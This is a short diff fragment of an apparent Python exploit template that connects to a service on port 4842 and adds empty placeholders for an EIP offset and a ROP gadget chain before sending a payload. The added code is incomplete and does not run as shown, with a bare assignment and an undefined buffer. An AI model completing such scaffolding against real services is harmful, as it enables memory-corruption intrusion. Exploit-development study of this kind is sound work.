@@ -23,3 +23,15 @@ s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 s.connect((sys.argv[1], 4842))
 s.recv(1024)
+
+eip_off=
+hrop = [
+
+  ]
+rop=""
+for i in hrop:
+  rop += struct.pack('I', i)
+
+s.send(buf)
+rbuf= s.recv(1024)
+s.close()
